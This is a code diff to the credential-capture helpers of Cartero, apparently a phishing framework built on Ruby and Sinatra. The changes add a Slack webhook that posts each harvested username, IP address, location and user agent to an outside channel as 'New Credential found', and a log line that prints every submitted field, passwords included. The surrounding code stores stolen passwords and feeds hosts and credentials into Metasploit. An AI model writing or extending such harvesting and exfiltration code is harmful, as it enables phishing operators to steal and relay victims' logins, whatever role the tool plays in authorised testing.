@@ -1,3 +1,4 @@
+require 'slack-notifier'
 #encoding: utf-8
 module Cartero
 # Documenation for SinatraHelpers
@@ -9,6 +10,7 @@ module Cartero
 # - return_img
 module SinatraHelpers
   def process_cred
+    log "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
     ua = Cartero::UserAgentParser.new(request.user_agent)
     ua.parse
 
@@ -32,8 +34,11 @@ module SinatraHelpers
       :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
     )
     creds.save!
-
-    process_metasploit_creds
+		# Why not I am lazy and this is a much 2.0 way of logging
+		# things real time while I work with the team
+		slack_notification
+    # Process metasploit creds if metasploit flag is enabled
+		process_metasploit_creds
   end
 
   def process_info
@@ -43,12 +48,12 @@ module SinatraHelpers
         @data = JSON.parse(::Cartero::CryptoBox.decrypt(params[:key] || cookies["session_info"]),{:symbolize_names => true})
         cookies["session_info"] ||= params[:key]
       rescue RbNaCl::CryptoError
-        $stdout.puts "#{Time.now} - ERROR Entity Could not be decrypt it. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
-        $stdout.puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - ERROR Entity Could not be decrypt it. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
         return
       rescue ArgumentError
-        $stdout.puts "#{Time.now} - ERROR Entity Could not be parsed correctly. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
-        $stdout.puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - ERROR Entity Could not be parsed correctly. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
         return
       end
       # Save or Create a new person hitting the URL path.
@@ -57,9 +62,9 @@ module SinatraHelpers
       # if listener was started with metasploit RPC option
       process_metasploit
 
-      puts "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+      log "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
     else
-      puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+      log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
     end
   end
 
@@ -74,9 +79,44 @@ module SinatraHelpers
       :disposition => :inline)
   end
 
+  def log(message)
+    $stdout.puts message if settings.verbose
+  end
+
+  def log_debug(message)
+    $stdout.puts message if settings.debug
+  end
+
   private
 
-  def save_create_person
+	def	slack_notification
+    if ::Cartero::GlobalConfig["slack"]
+      @slack ||= Slack::Notifier.new ::Cartero::GlobalConfig["slack"]["webhook"],
+        username: ::Cartero::GlobalConfig["slack"]["username"],
+        channel: ::Cartero::GlobalConfig["slack"]["channel"]
+  		data = {
+        title: "Cartero Credential Information",
+        fallback: "*IP:* #{request.ip}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
+        "*USER-AGENT* #{request.user_agent}",
+        text: "*IP:* #{request.ip}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
+        "*USER-AGENT* #{request.user_agent}",
+        color: "#7CD197",
+        mrkdwn_in: ['pretext', 'text', 'fallback']
+      }
+      data[:title_link] = ::Cartero::GlobalConfig["slack"]["adminweb"] + "/stats/credentials" if ::Cartero::GlobalConfig["slack"]["adminweb"]
+      @slack.ping(
+        "New Credential found on #{request.base_url}",
+        attachments: [ data],
+        icon_url: "http://s30.postimg.org/kx40gchpd/Screen_Shot_2015_03_16_at_19_30_14.png"
+      )
+    end
+	end
+
+	def save_create_person
     person = Person.where(:email => @data[:email]).first
 
     if person.nil?
@@ -165,7 +205,7 @@ module SinatraHelpers
     wspace = settings.metasploit.get_workspace()
     if params[:key].nil?
       # Adding hosts if it does not exists
-      puts "[*] - Adding host #{request.ip} to metasploit"
+      log "[*] - Adding host #{request.ip} to metasploit"
       settings.metasploit.add_host({
         :workspace => wspace["name"],
         :host => request.ip,
@@ -177,7 +217,7 @@ module SinatraHelpers
         :name => "#{request.ip}_#{ua.os.gsub(' ', '_')}",
         :purpose=> "client"
       })
-      puts "[*] - Adding client #{ua.browser.split(' ')[0]} to metasploit"
+      log "[*] - Adding client #{ua.browser.split(' ')[0]} to metasploit"
       # Adding Web Client if it does not exists and link it to hosts.
       settings.metasploit.add_client({
         :ua_string => request.user_agent,
@@ -187,7 +227,7 @@ module SinatraHelpers
       })
     end
     # Add Credentials :-)
-    puts "[*] - Adding client #{params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]} to metasploit"
+    log "[*] - Adding client #{params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]} to metasploit"
     # {origin_type: :service, address: '192.168.19.1', port: 9090, service_name: 'http', protocol: 'tcp',
     # module_fullname: 'auxiliary/scanner/http/cartero', workspace_id: 1,
     # private_data: 'password1', private_type: :password, username: 'Administrator', last_attempted_at: Time.now.to_s, status: "Successful"}
